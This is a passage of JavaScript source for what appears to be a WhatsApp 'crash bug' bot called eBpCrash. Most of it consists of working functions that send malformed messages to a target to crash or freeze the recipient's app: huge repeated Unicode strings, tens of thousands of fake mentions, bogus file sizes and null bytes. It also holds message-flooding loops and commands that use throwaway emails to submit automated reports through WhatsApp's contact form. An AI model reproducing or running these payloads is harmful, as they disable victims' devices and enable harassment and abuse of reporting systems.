AAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
              sourceType: " x ",
              sourceId: " x ",
              sourceUrl: "https://www.instagram.com/WhatsApp",
              mediaUrl: "https://www.instagram.com/WhatsApp",
              containsAutoReply: true,
              renderLargerThumbnail: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://wa.me/settings"
            },
            groupSubject: "Example Group Subject",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: "trust_banner_example",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: "utm_source_example",
              utmCampaign: "utm_campaign_example"
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, ptcp ? {
        participant: {
          jid: jid
        }
      } : {});
      console.log(chalk.blue("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 CallCrash 𝐁𝐲 ｢ eBpCrash ｣"));
    };
    
    async function StuckSql(X, ThM, Ptcp = true) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: " ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ ",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ 󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲  ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ " + '󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲ '.repeat(350000),
								},
								nativeFlowMessage: {},
								contextInfo: {
									mentionedJid: ["62895364760801@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: " ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ ",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				}), {
					userJid: X,
					quoted: null
				}
			);
			await ekuzika.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.red("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 StuckSql 𝐁𝐲 ｢ eBpCrash ｣"));
		};
		
		async function newvirpen(target) {
    let virtex = "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s" + "ꦾ".repeat(500000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: virtex 
                        }]
                    }
                }
            }
        }
    };

    await ekuzika.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
    console.log(chalk.red("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 newvirpen 𝐁𝐲 ｢ eBpCrash ｣"));
}

//===========================================================//

      async function FaxzLocOs4(X) {
  try {
    var atc = generateWAMessageFromContent(X, proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: "P", // Lokasi palsu
                    degreesLongitude: "Bnah", // Lokasi palsu
                    caption: "𑜦࣯𑜦࣯𑜦࣯☠️ ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ ☠️𑜦࣯𑜦࣯𑜦࣯" + "𑜦࣯".repeat(750000) + "ꦾ". repeat(20000), 
                    sequenceNumber: "0",
                    jpegThumbnail: ""
                }
            }
        }
   }), {
      userJid: X,  // X = target
      quoted: null 
    });
    await ekuzika.relayMessage(X, atc.message, {
      participant: { jid: X }, 
      messageId: atc.key.id
    });
    console.log("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 LocOs 𝐁𝐲 ｢ eBpCrash ｣");

     } catch (error) {
    console.error("Failed to send message:", error);
  }
}


async function caltx(LockJids) {
  let etc = generateWAMessageFromContent(
    LockJids,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          scheduledCallCreationMessage: {
            scheduledTimestampMs: Date.now(),
            callType: 2,
            title: "𑜦࣯𑜦࣯𑜦࣯☠️ ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ ☠️𑜦࣯𑜦࣯𑜦࣯" + '\0'.repeat(99999)
          }
        }
      },
    }), {
      userJid: LockJids
    }
  );
  await ekuzika.relayMessage(LockJids, etc.message, {});
}
async function ClGc(LockJids) {
  await ekuzika.relayMessage(LockJids, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            locationMessage: {},
            hasMediaAttachment: true
          },
          body: {
            text: "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ" + "ꦾ".repeat(900000)
          },
          nativeFlowMessage: {
            messageParamsJson: ""
          },
          carouselMessage: {}
        }
      }
    }
  }, {});
  let target = xbug
  await ekuzika.sendMessage(LockJids, {
    sticker: target
  }, {
    quoted: null
  })
}

async function newfreezebug(target) {
    let virtex = "༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ ";

    await ekuzika.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex + "@1".repeat(1020000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "★ ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ ★" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

// Func Bug By Tama Ryuichi
		// Edit = Yatim + Maklu Mati
		// Don't re-edit guys:)
		async function tamaLoca(target) {
            let virtex = "★༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ★-";
            let memekz = Date.now();

            await ekuzika.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⩟ ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ ⩟" + "ꦾ".repeat(500000) + "@1".repeat(203000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "EBPXENTRY" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
            console.log(chalk.red("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 Loc 𝐁𝐲 ｢ eBpCrash ｣"));
        }
       
         async function tamaDocu(target) {
            let virtex = "📄𝗗𝗼𝗰𝘂𝗺𝗲𝗻𝘁𝗞𝗶𝗹𝗹𝗲𝗿 ~";

            ekuzika.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "*📄Ebp𝐂𝐫𝐚𝐬𝐡𝐃𝐨𝐜𝐮𝐦𝐞𝐧𝐭*" + "★𑜦࣯".repeat(500000) + "ꦾ".repeat(203000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "EBPXENTRY" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
            console.log(chalk.red("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 Docu 𝐁𝐲 ｢ eBpCrash ｣"));
        }

async function BrutalOverload(target) {
        await ekuzika.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: " ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ " + "@1".repeat(703000) + "@0".repeat(100000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 35000 }, () => "1" + Math.floor(Math.random() * 500000) + "@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "EBPCRASH" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
            console.log(chalk.green(" Brutal Overload in Progress, Unstoppable Pressure! "))
        }

async function Floods3(target) {
    for (let i = 0; i < 3; i++) {
        
            ekuzika.relayMessage(target, {
             groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: -999.03499999999999,
                            degreesLongitude: 999.03499999999999
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾꦾꦾꦾ☠️ ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ ☠️ꦾꦾꦾꦾ \n" + "0@".repeat(1000000) + "@1".repeat(203000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 35000 }, () => "1" + Math.floor(Math.random() * 500000) + "@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "EBPCRASH" }]
                        }
                    }
                }
            }
        }, { participant: { jid: target } }, { messageId: null });

        // Jeda 3 detik
        ////await new Promise(resolve => setTimeout(resolve, 2000));
        await sleep(1200)
        console.log(chalk.red("𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 Floods 𝐁𝐲 ｢ eBpCrash ｣"));
        }
        //ekuzika.sendMessage(global.owner + '@s.whatsapp.net', { text : "Floods Active, Now Floods Was Brutal Ui...." })
  };
  
  async function ziosX1(target) {
    await ekuzika.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: 'UPI',
                expiryTimestamp: Date.now() + 86400000, // 1 day in milliseconds
            },
        },
        { participant: { jid: target } }
    );
}

async function ziosX2(target) {
    await ekuzika.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: 'galaxy_message',
                expiryTimestamp: Date.now() + 86400000000, // 1000 days in milliseconds
            },
        },
        { participant: { jid: target } }
    );
}

async function ziosX3(target) {
    await ekuzika.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: 'POLLING',
                expiryTimestamp: Date.now() + 86400000000, // 1000 days in milliseconds
            },
        },
        { participant: { jid: target } }
    );
}

async function ziosX4(target) {
    await ekuzika.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: 'FBPAY',
                expiryTimestamp: Date.now() + 1814400000, // 21 days in milliseconds
            },
        },
        { participant: { jid: target } }
    );
}

async function sendAllPaymentInvites(target, repeatCount) {
    for (let i = 0; i < repeatCount; i++) {
        await ziosX1(target)
        await ziosX1(target)
        await ziosX1(target)
        await ziosX1(target)
        await sleep(500)
        
        await ziosX2(target)
        await ziosX2(target)
        await ziosX2(target)
        await ziosX2(target)
        await sleep(500)
        
        await ziosX3(target)
        await ziosX3(target)
        await ziosX3(target)
        await ziosX3(target)
        await sleep(500)
        
        await ziosX4(target)
        await ziosX4(target)
        await ziosX4(target)
        await ziosX4(target)
        await sleep(2300)
    }
}

    async function unlock(X, QTD) {
      await ekuzika.sendMessage(
        X,
        {
          text: `🦋⃟ᴠͥɪͣᴘͫ•𝗨𝗡𝗟𝗢𝗖𝗞 𝗕𝗨𝗚•🦋⃟ᴠͥɪͣᴘͫ\n\n\n${readMore}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ `,
        },
        {
          quoted: QTD,
        }
      );
      //console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ CrazyCrash ⿻ ▾⭑"));
    }
    const dottm = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
      },
      message: {
        orderMessage: {
          orderId: "999999999999",
          thumbnail: null,
          itemCount: 999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: " ༑⌁⃰ɛɮք ƈʀ͢ǟֆɦ⭑̤ཀ ",
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==",
        },
      },
      contextInfo: {
        mentionedJid: ["0@s.whatsapp.net"],
        forwardingScore: 999,
        isForwarded: true,
      },
    };
		
		// End Func Bug
		
let list = []
list.push({
displayName: `${namacreator}`,
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${namacreator}\n
FN:${namacreator}\n
item1.TEL;waid=${owner}:${owner}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: ebpcrash@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/
item3.X-ABLabel:Github\n
item4.ADR:;;Japan;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})


function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await ekuzika.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}


// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `ekuzika`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
 
//Status
if (!ekuzika.public) {
if (!m.key.fromMe) return
} 

async function loading () {
var baralod = [
"*_£&€¥_*",
"*_¿》¤▪♧¿><_*",
"*_¿¡£€#%◇□●_*", 
"*_LOADING_*",
"*_SUKSSES FULL_*", 
]
let { key } = await ekuzika.sendMessage(from, {text: '*E*'})

for (let i = 0; i < baralod.length; i++) {
await ekuzika.sendMessage(from, {text: baralod[i], edit: key });
}
}
    
    async function loadingbuk() {
      var loadingz = [
        "> 𝗕𝘂𝗴 𝗦𝗲𝗹𝗲𝘀𝗮𝗶 𝗗𝗮𝗹𝗮𝗺",
        "> 3",
        "> 3",
        "> 2",
        "> 2",
        "> 1",
        "> 1",
        "> 0",
        "> 0",
        "*𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗦𝗲𝗹𝗲𝘀𝗮𝗶 🤭*",
      ];
      let { key } = await ekuzika.sendMessage(m.chat, {
        text: "𝗕𝗲𝗻𝘁𝗮𝗿, 𝗟𝗮𝗴𝗶 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗻𝘆𝗮 . . .",
      });

      for (let i = 0; i < loadingz.length; i++) {
        await sleep(600);
        await ekuzika.sendMessage(m.chat, { text: loadingz[i], edit: key });
      }
    }    

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)
const frpl = await reSize(xbug, 480, 640)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
ekuzika.relayMessage(jid, order.message, { messageId: order.key.id})
}

const xrep = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: ` ᴇʙᴘ 𝙲𝚛𝚊𝚜𝚑 💸`
}
}
}

const extd = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`,
remoteJid: "status@broadcast" 
},
'message': {
extendedTextMessage: {
text: "༑⌁⃰ɛɮ ̲̅ք ƈʀ͢ǟֆɦ⭑̤ཀ ̲̅"
}
}
};

const fpay = { key: { remoteJid: '0@s.whatsapp.net', fromMe: false, id: global.namabot, participant: '0@s.whatsapp.net'}, message: { requestPaymentMessage: { currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: global.namabot }}, expiryTimestamp: 999999999, amount: { value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const fkontak = { 
        key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`, 
            ...(from ? { remoteJid: "status@broadcast" } : {}) },
             message: { 
             'contactMessage': { 
             'displayName': `${pushname}`, 
             'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 
             'jpegThumbnail': xbug
             }
        }
   }
             
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
  // Function Reply
const reply = (teks) => {
            ekuzika.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `ɛɮք ƈʀ͢ǟֆɦ`,
            "body": `${namabot}`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": xbug,
            "sourceUrl": `${isLink}`
        }
    }
},
{ quoted: fkontak })
        }

if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
ekuzika.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
ekuzika.groupParticipantsUpdate(m.chat, [sender], 'delete')
ekuzika.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {
//=================================================//
case 'unbandv1': {
await loading()
if (!text) {
let cekno = await ekuzika.onWhatsApp(text)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (text == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban1}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
m.reply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
m.reply(`Sedang Limit Tunggu Beberapa Saat.`)
m.reply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================//
case 'unbandv2': {
if ((!(isGroupAdmins || isCreator))) return m.reply('𝘖𝘯𝘭𝘺 𝘍𝘰𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳 ;(')
await loading()
if (!text) {
let cekno = await ekuzika.onWhatsApp(text)
if (cekno.length == 0) return m.reply(`Targetnya Sudah Gk Terdaftar Di Whatsapp Bro-_#`)
if (text == global.ownermain + "@s.whatsapp.net") return m.reply(`Lah Inikan Nomor Ayang Gw(Owner)`)
var targetnya = m.sender.split('@')[0]
try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=300")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("Input[name=jazoest]").val())
form.append("lsd", $form.find("Input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", `${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `${unban2}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`Succes Beb..! Tunggu Dalam Kurun Waktu 24 Jam Atau 1 Minggu`)
m.reply(util.format(res.data))
} else if (payload.includes(`"payload":false`)) {
m.reply(`Sedang Limit Tunggu Beberapa Saat.`)
m.reply(util.format(res.data))
} else m.reply(util.format(res.data))
} catch (err) {m.reply(`${err}`)}
} else m.reply(`Masukkan Nomor Target!\n[✓] Ini Contohnya > ${prefix+command} 623333XXXXX`)
}
break
//=================================================/
case 'unbandv3': {
if ((!(isGroupAdmins || isCreator))) return m.reply('𝘖𝘯𝘭𝘺 𝘍𝘰𝘳 𝘗𝘳𝘦𝘮𝘪𝘶𝘮 𝘜𝘴𝘦𝘳 ;(')
await loading()
if (!text) {
